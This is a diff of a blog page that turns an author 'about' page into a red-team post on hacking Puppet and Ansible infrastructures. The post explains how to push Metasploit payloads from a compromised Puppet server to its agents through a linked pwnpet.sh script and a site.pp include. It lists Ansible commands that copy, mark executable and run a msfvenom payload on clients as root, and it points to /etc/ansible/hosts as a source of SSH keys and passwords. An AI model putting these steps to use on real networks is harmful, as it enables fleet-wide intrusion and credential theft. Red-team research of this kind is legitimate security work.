@@ -20,7 +20,7 @@
 
     <!--Open Graph Title-->
     
-        <meta property="og:title" content="about"/>
+        <meta property="og:title" content="Enterprise Offense: IT Operations [Part 1] - Hacking Puppet and Ansible Infrastructures&quot;"/>
     
 
     <!--Open Graph Description-->
@@ -44,7 +44,7 @@
 
     <!-- Title -->
     
-    <title>about - c0dehouse</title>
+    <title>Enterprise Offense: IT Operations [Part 1] - Hacking Puppet and Ansible Infrastructures&quot; - c0dehouse</title>
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
@@ -171,18 +171,20 @@
 
     <div class="post-header">
         <h1 class="title">
-            <a href="/about/index.html">
-                about
+            <a href="/2017/06/11/Enterprise-Offense-IT-Operations-Part-1/">
+                Enterprise Offense: IT Operations [Part 1] - Hacking Puppet and Ansible Infrastructures"
             </a>
         </h1>
         <div class="post-info">
 
 
             
+                <span class="author">Author: <a href="https://twitter.com/TanoyBose" target="_blank">Tanoy Bose</a></span> <br>
+            
 
 
             
-                <span class="date">2016-11-24</span>
+                <span class="date">2017-06-11</span>
             
             <a href="#disqus_thread" class="comments">Comments</a>
             
@@ -195,14 +197,29 @@
         
 
         <!-- Post Content -->
-        <h3 id="cat-etc-motd"><a href="#cat-etc-motd" class="headerlink" title="$ cat /etc/motd"></a>$ cat /etc/motd</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">           ________          .</div><div class="line">         ,88888PP8ba,  8b   d8b    d8b&apos;</div><div class="line">       ,d8P&quot;      &quot;Y8b I8   888   d88b&apos;</div><div class="line">       a8&quot;         &apos;Yd  Yb  &quot;*&quot; ,ad8&quot;</div><div class="line">       &quot;            )8   &quot;8aaaaa8b&quot;</div><div class="line">                   ,dP     &quot;&quot;&quot;&quot;&quot;&quot;</div><div class="line">                  ,a8&quot;   ________</div><div class="line">          &quot;8gggggg88I  ,d88888888b,</div><div class="line">           &quot;8&apos;    &apos;a8b,88&quot;      &quot;Y8)</div><div class="line">                   &quot;Y8b&apos;          d8)</div><div class="line">                    &apos;Ydb         ,88&apos;</div><div class="line">                     )8b         d88&apos;</div><div class="line">     8(b             ,dP        (8P&apos;</div><div class="line">     &quot;I8            ,a8&quot;       d88&apos;</div><div class="line">       Yb,_________,a8&quot;&apos;Y8b  ,ad8&quot;</div><div class="line">        &quot;8ggggggggg8&quot;   &apos;Y88888Y&quot;</div><div class="line">           &quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;       &quot;&quot;&quot;&quot;&apos;</div><div class="line"></div><div class="line">The best idea is anonymous.</div><div class="line">-Tanoy Bose</div></pre></td></tr></table></figure>
-<h3 id="whois-HOST"><a href="#whois-HOST" class="headerlink" title="$ whois HOST"></a>$ whois HOST</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">% IANA WHOIS server</div><div class="line">% for more information on IANA, visit http://www.iana.org</div><div class="line">% This query returned 1 object</div><div class="line"></div><div class="line">Name: Tanoy Bose</div><div class="line">Handle: n0tty, kalki_108</div><div class="line">Freenode IRC Nick: n0tty, Bose</div><div class="line">Freenode IRC Channel: ##hiya, #vulnhub</div><div class="line">Profession: Security Researcher and Consultant</div><div class="line">Certifications: Distinctions in Cryptography 1 (Stanford University - Coursera), Python Programming Fundamentals (Coursera),</div><div class="line">                CyberArk Professional Partner (Till now have done only free certifications, going to do others soon =D )</div><div class="line">CTF Win - InCTF 2014 (Team: The Flying Dutchman, 1st place)</div><div class="line">CTF Finals - Nullcon HackIM (EMC Defender&apos;s league) 2014, Nullcon HackIM (EMC Defender&apos;s League) 2015</div><div class="line">Hall of Fames - 9</div><div class="line">CVE - 1</div><div class="line">Other Interests - Guitar, Music.</div></pre></td></tr></table></figure>
-<p><a href="./TanoyBose.pdf"><strong><em>Resume</em></strong></a></p>
+        <h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Compromising the Active Directory and the domain administrator has mainly been the goal of an infrastructure penetration test or a red team engagment. This is so because once you have the domain administrator, you could start accessing the various infrastructure components and show the potential threat that such a compromise could cause. However, during penetration testing of a non-Active Directory infrastructure, the ultimate goal is extremely unclear. At such assessments, we end up compromising one system, one database and terminate our exercise. Such environments could include but not limited to ERP infrastructure (SAP systems), SCADA infrastructure (linux and windows systems), Telecom infrastructure (linux and windows systems), Banking infrastrucure (SWIFT). During my work with such infrastructures I researched interesting compromise that could give you priviledges similar to that of domain administrator, and do this by using specific IT operation tools. This blog isn’t going to be about exploitation but would rather have interesting ways of post exploitation pillaging.<br><a id="more"></a><br>Thanks to bitvijays for his help to make me understand the working of puppet. :)</p>
+<h3 id="Non-Active-Directory-Infrastructure-and-Hypervisors"><a href="#Non-Active-Directory-Infrastructure-and-Hypervisors" class="headerlink" title="Non - Active Directory Infrastructure and Hypervisors"></a>Non - Active Directory Infrastructure and Hypervisors</h3><p>Before we begin, I would like to bring something funny that I noticed almost in every client that I have been to. An non-ad infra is fairy simple to compromise if you have access to the active directory and the domain administrator. Yes! And the key to this is the hypervisors. No matter how isolated the infrastructure has been, I have always noticed people hosting them on a hypervisor that is actually connected to the domain. </p>
+<h2 id="Puppet-Infrastructure"><a href="#Puppet-Infrastructure" class="headerlink" title="Puppet Infrastructure"></a>Puppet Infrastructure</h2><p>Puppet is a pull type configuration managing service. What I mean by this is, there is a Puppet Server where the administrator creates configurations and the Puppet clients pull this configurational change and execute on their respective systems. This would mean that an administrator would either need to manually do it on every system after implementing a change or run a scheduled task on puppet clients to sync with the server.<br>Below is a small diagramatic representation of a Puppet infrastructure.<br><img src="/2017/06/11/Enterprise-Offense-IT-Operations-Part-1/puppet.png" alt="Puppet Infratructure" title="Puppet Infratructure"></p>
+<h3 id="Directory-structure-of-Puppet"><a href="#Directory-structure-of-Puppet" class="headerlink" title="Directory structure of Puppet"></a>Directory structure of Puppet</h3><p>Puppet Server generally has its configurations saved in /etc/puppet/code/<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">/etc/puppet/code\</div><div class="line">	|- environment\</div><div class="line">		|- production\</div><div class="line">			|- manifest\</div><div class="line">			|	|- site.pp</div><div class="line">			|- modules\</div><div class="line">			|	|- module_name\</div><div class="line">			|	|	|- files\</div><div class="line">			|	|	|	|- &lt;files to be deployed&gt;</div><div class="line">			|	|	|- manifests\</div><div class="line">			|	|	|	|- init.pp</div></pre></td></tr></table></figure></p>
+<h2 id="Puppet-for-Hackers-pwnpet-sh"><a href="#Puppet-for-Hackers-pwnpet-sh" class="headerlink" title="Puppet for Hackers - pwnpet.sh"></a>Puppet for Hackers - pwnpet.sh</h2><p>During the reconnaisance phase, the attacker can identify the puppet server from any of the puppet clients by looking into /etc/puppet/puppet.conf<br></p>
+<p>Assuming you have access to the Puppet server, below would be the tutorial that would be helpful in pwning the puppet servers.<br>I have built an automated script to push malicious metasploit code to the puppet agents. The code is available at <a href="https://github.com/n0tty/Random-Hacking-Scripts/pwnpet.sh" target="_blank" rel="external">Randome-Hacking-Scripts/pwnpet.sh</a><br>What this script basically does is, it creates output folder with 2 folders in it<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">output_folder\</div><div class="line">|- manifests\</div><div class="line">|	|- site.pp</div><div class="line">|- modules\</div><div class="line">|	|- my_file\</div><div class="line">|	|	|- files\</div><div class="line">|	|	|	|- payload</div><div class="line">|	|	|- manifests\</div><div class="line">|	|	|	|- init.pp</div></pre></td></tr></table></figure></p>
+<p>Now, all that is required to be done is to take the my_file folder and add the entire folder into /etc/puppet/code/environment/production/modules/ directory. Also, we would need to include my_file insite /etc/puppet/code/environment/production/manifests/site.pp<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">node <span class="string">'puppetclient'</span> &#123;</div><div class="line">	include my_file</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>Remember to include my_file in every node that you would like to obtain a metaspoit session on.<br>Now all you need to do is wait on the terminal running metasploit (that was open during the execution of pwnpet.sh)</p>
+<p>I have made a small video demonstration of running this script on the below architecture<br><img src="/2017/06/11/Enterprise-Offense-IT-Operations-Part-1/puppetInfra.png" alt="Puppet Lab Infrastructure" title="Puppet Lab Infrastructure"><br>Here is a video demonstration of the script -<br><div class="video-container"><iframe src="//www.youtube.com/embed/bYbyHd2UZ70" frameborder="0" allowfullscreen></iframe></div></p>
+<h2 id="Ansible-Infrastructure"><a href="#Ansible-Infrastructure" class="headerlink" title="Ansible Infrastructure"></a>Ansible Infrastructure</h2><p>Ansible on the other hand is a Push type configuration managing service. This means, an administrator can login into the Ansible server and push new configurations out to the Ansible clients.<br>Below is a small diagramatic representation of a Ansible infrastructure.<br><img src="/2017/06/11/Enterprise-Offense-IT-Operations-Part-1/ansible.png" alt="Ansible Infrastructure" title="Ansible Infrastructure"></p>
+<h3 id="Fun-Fact"><a href="#Fun-Fact" class="headerlink" title="Fun Fact:"></a>Fun Fact:</h3><p>Check the ansible hosts file in the server at /etc/ansible/hosts, you will get information regarding all the servers managed by that server along with either their ssh keys or their passwords. You really don’t need to deploy metasploit payloads using ansible server then.</p>
+<h2 id="Ansible-for-Hackers-pwnsible-sh"><a href="#Ansible-for-Hackers-pwnsible-sh" class="headerlink" title="Ansible for Hackers - pwnsible.sh"></a>Ansible for Hackers - pwnsible.sh</h2><p>Using ansible to propagate is quite simple. All you need to do is, create a metasploit payload using msfvenom (let us call it payload.file) and save it on /etc/ansible/ folder on the Ansible Server. After this, you’ll need to run the following 3 commands on the Ansible server -<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">root@ansibleserver$ ansible &lt;ansibleclient&gt; -m copy <span class="_">-a</span> <span class="string">"src=/etc/ansible/payload.file  dest=/tmp/"</span> -u root</div><div class="line">root@ansibleserver$ ansible &lt;ansibleclient&gt; -m shell <span class="_">-a</span> <span class="string">"chmod +x /tmp/payload.file"</span> -u root</div><div class="line">root@ansibleserver$ ansible &lt;ansibleclient&gt; -m shell <span class="_">-a</span> <span class="string">"/tmp/payload.file"</span></div></pre></td></tr></table></figure></p>
+<p>I have however, created an automated script for ansible pwnage for easier usage which is available at <a href="https://github.com/n0tty/Random-Hacking-Scripts/pwnsible.sh" target="_blank" rel="external">Random-Hacking-Scripts/pwnsible.sh</a></p>
 
     </div>
 
     
 
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/Red-Team/">#Red Team</a> <a href="/tags/IT-Operations-hacking/">#IT Operations hacking</a> <a href="/tags/Enterprise-Offense/">#Enterprise Offense</a> <a href="/tags/Puppet-Hack/">#Puppet Hack</a> <a href="/tags/Ansible-Hack/">#Ansible Hack</a>
+        </div>
     
 
     <!-- Comments -->
@@ -221,6 +238,7 @@
 </div>
 
         </section>
+
     </div>
 </div>
 
